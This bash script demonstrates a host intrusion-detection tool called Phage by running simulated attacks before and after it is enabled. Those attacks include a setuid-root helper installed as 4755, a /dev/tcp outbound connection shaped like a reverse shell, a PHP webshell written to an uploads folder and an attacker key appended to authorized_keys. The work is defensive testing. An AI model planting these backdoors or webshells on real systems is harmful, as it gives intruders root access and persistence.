#!/usr/bin/env bash
# proof.sh — before/after evidence that Phage detects and contains real attacks.
# Each attack runs once with no Phage (it succeeds) and once with Phage active
# (detected, contained, or blocked). All local to this authorized test box; every
# scenario isolates its own Phage instance so each "before" truly has none.
set -uo pipefail
cd /root/phage

OBJ=bpf/build/sensors.bpf.o
LSM=bpf/build/jail_lsm.bpf.o
STATE=/tmp/proof-baseline.json
WEB=/var/www/html
DEMOH=/home/demo
SR="systemd-run --quiet"

sec() { echo; echo "================================================================"; echo "## $*"; echo "================================================================"; }
sub() { echo; echo ">>> $*"; }
thaw_all() { for f in $(find /sys/fs/cgroup -name cgroup.freeze 2>/dev/null); do [ "$(cat "$f" 2>/dev/null)" = "1" ] && echo 0 > "$f" 2>/dev/null || true; done; }
stopunit() { systemctl stop "$1.service" 2>/dev/null || true; systemctl reset-failed "$1.service" 2>/dev/null || true; }
cleanup() {
	pkill -x phaged 2>/dev/null || true; pkill -x phage-jail 2>/dev/null || true; thaw_all
	for u in proof-attack proof-egress proof-persist; do stopunit "$u"; done
	rm -rf "$WEB" "$DEMOH" /tmp/seed.php /tmp/proof-lock-out
	rmdir /sys/fs/cgroup/proof-lock 2>/dev/null || true
}
trap cleanup EXIT

# ---- prerequisites -----------------------------------------------------------
sec "PREREQUISITES"
cat > /tmp/rootsh.c <<'C'
#include <unistd.h>
int main(int argc, char **argv) {
	setgid(0); setuid(0);                 /* the exploit payload: become root */
	if (argc > 1) execvp(argv[1], argv + 1);
	execl("/usr/bin/id", "id", (char *)0);
	return 1;
}
C
clang -O2 -o /usr/local/bin/rootsh /tmp/rootsh.c
chown root:root /usr/local/bin/rootsh && chmod 4755 /usr/local/bin/rootsh
echo "setuid-root helper (stands in for an exploit that reaches root):"; ls -la /usr/local/bin/rootsh
mkdir -p "$WEB/uploads" "$DEMOH/.ssh"; : > "$DEMOH/.ssh/authorized_keys"; echo '<?php /* app */ ?>' > /tmp/seed.php

# ---- baseline ----------------------------------------------------------------
sec "BASELINE — Phage learns this host's normal behaviour first"
rm -f "$STATE"
./bin/phaged -bpf "$OBJ" -mode learn -state "$STATE" >/tmp/proof-learn.log 2>&1 &
LP=$!; sleep 1
echo "generating normal activity (execs, HTTPS egress, privileged ops WITH a session, deploy writes)..."
for i in $(seq 1 20); do
	ls / >/dev/null; grep -q root /etc/passwd; date >/dev/null
	curl -s -o /dev/null --max-time 2 https://1.1.1.1/ || true
	runuser -u nobody -- /usr/local/bin/rootsh id >/dev/null 2>&1 || true
	cp /tmp/seed.php "$WEB/app_$i.php"
done
sleep 1; kill -TERM "$LP" 2>/dev/null; wait "$LP" 2>/dev/null
echo "baseline learned: $(wc -c < "$STATE") bytes"

# ============================================================================
sec "SCENARIO 1 — Privilege escalation (RCE reaches root)   [CONTAIN]"
sub "BEFORE (no Phage): a session-less service process reaches root"
$SR --unit=proof-attack -p User=nobody --wait --pipe /usr/local/bin/rootsh id 2>&1 | sed 's/^/   /'
stopunit proof-attack
echo "   => uid=65534 but euid=0(root): escalation SUCCEEDED, nothing stopped it."

sub "AFTER (Phage enforce): the exploited service (bash) escalates via the setuid helper"
./bin/phaged -bpf "$OBJ" -mode enforce -state "$STATE" >/tmp/proof-enforce.log 2>&1 &
EP=$!; sleep 1
# the trailing "; true" stops bash exec-optimising into rootsh, so rootsh's
# parent is the (exploited) bash, not systemd — a realistic exploit chain.
$SR --unit=proof-attack -p User=nobody bash -c '/usr/local/bin/rootsh sleep 60; true'
sleep 2
echo "   Phage verdict + action:"
grep -E "raised to root|FROZEN" /tmp/proof-enforce.log | sed 's/^/     /'
FPID=$(grep -oE "CONTAIN pid=[0-9]+ comm=\"rootsh\" FROZEN" /tmp/proof-enforce.log | grep -oE "[0-9]+" | head -1)
QF="/sys/fs/cgroup/phage/quar-$FPID/cgroup.freeze"
echo "   quarantine cgroup /sys/fs/cgroup/phage/quar-$FPID/cgroup.freeze = $(cat "$QF" 2>/dev/null)   (1 = frozen)"
echo "   => the escalating process was moved into a dedicated cgroup and FROZEN mid-run (reversible)."
[ -n "$FPID" ] && echo 0 > "$QF" 2>/dev/null
pkill -9 -f "rootsh sleep 60" 2>/dev/null
thaw_all; stopunit proof-attack; kill -TERM "$EP" 2>/dev/null; wait "$EP" 2>/dev/null

# ============================================================================
sec "SCENARIO 2 — Reverse shell / C2 egress   [DETECT]"
sub "BEFORE (no Phage): a session-less service dials out"
$SR --unit=proof-egress -p User=nobody --wait --pipe \
	bash -c 'exec 3<>/dev/tcp/1.1.1.1/53 && echo "   connected to 1.1.1.1:53 (reverse-shell shape)"' 2>&1 | sed 's/^/   /'
stopunit proof-egress
echo "   => outbound connection SUCCEEDED, nothing noticed."

sub "AFTER (Phage alert): same dial-out"
./bin/phaged -bpf "$OBJ" -mode alert -state "$STATE" >/tmp/proof-alert2.log 2>&1 &
AP=$!; sleep 1
$SR --unit=proof-egress -p User=nobody --wait bash -c 'exec 3<>/dev/tcp/1.1.1.1/53' >/dev/null 2>&1
stopunit proof-egress; sleep 2
echo "   Phage verdict:"
grep -E "score=" /tmp/proof-alert2.log | grep -iE "egress|outbound|:53" | sed 's/^/     /'
kill -TERM "$AP" 2>/dev/null; wait "$AP" 2>/dev/null

# ============================================================================
sec "SCENARIO 3 — Persistence: webshell + backdoored authorized_keys   [DETECT]"
sub "BEFORE (no Phage): the exploited web user plants a webshell and an SSH key"
rm -f "$WEB/uploads/shell.php"; : > "$DEMOH/.ssh/authorized_keys"
bash -c 'echo "<?php system(\$_GET[0]); ?>" > /var/www/html/uploads/shell.php; echo attacker-key >> /home/demo/.ssh/authorized_keys'
echo "   webshell present: $([ -s "$WEB/uploads/shell.php" ] && echo YES); key appended: $([ -s "$DEMOH/.ssh/authorized_keys" ] && echo YES)"
echo "   => persistence planted, nothing noticed."

sub "AFTER (Phage alert): same drop"
./bin/phaged -bpf "$OBJ" -mode alert -state "$STATE" >/tmp/proof-alert3.log 2>&1 &
AP=$!; sleep 1
bash -c 'echo "<?php system(\$_GET[0]); ?>" > /var/www/html/uploads/shell2.php; echo attacker-key2 >> /home/demo/.ssh/authorized_keys'
sleep 3
echo "   Phage verdict:"
grep -E "score=" /tmp/proof-alert3.log | grep -iE "authorized_keys|\.php|file class" | sed 's/^/     /'
kill -TERM "$AP" 2>/dev/null; wait "$AP" 2>/dev/null

# ============================================================================
sec "SCENARIO 4 — Auto-jail: an exploited service cannot spawn a shell (eBPF-LSM)   [PREVENT]"
rmdir /sys/fs/cgroup/proof-lock 2>/dev/null || true; mkdir /sys/fs/cgroup/proof-lock
sub "BEFORE (no jail): a process in the service cgroup spawns a shell"
bash -c 'echo $$ > /sys/fs/cgroup/proof-lock/cgroup.procs; exec /bin/bash -c "echo \"   shell spawned as $(id -un): a reverse shell would run here\""' 2>&1 | sed 's/^/   /'
echo "   => shell spawn SUCCEEDED."

sub "AFTER (phage-jail strict exec-lock on that cgroup): same attempt"
./bin/phage-jail lock -path proof-lock -bpf "$LSM" >/tmp/proof-jail.log 2>&1 &
JP=$!; sleep 2
if bash -c 'echo $$ > /sys/fs/cgroup/proof-lock/cgroup.procs; exec /bin/bash -c "echo SHELL_SPAWNED"' >/tmp/proof-lock-out 2>&1; then
	echo "   $(cat /tmp/proof-lock-out)  -> jail FAILED"
else
	echo "   $(tail -1 /tmp/proof-lock-out)  -> shell spawn DENIED at the kernel"
fi
echo "   => the exploited service is blocked from launching any shell."
kill -TERM "$JP" 2>/dev/null; wait "$JP" 2>/dev/null

sec "COMPLETE — cleaning up"
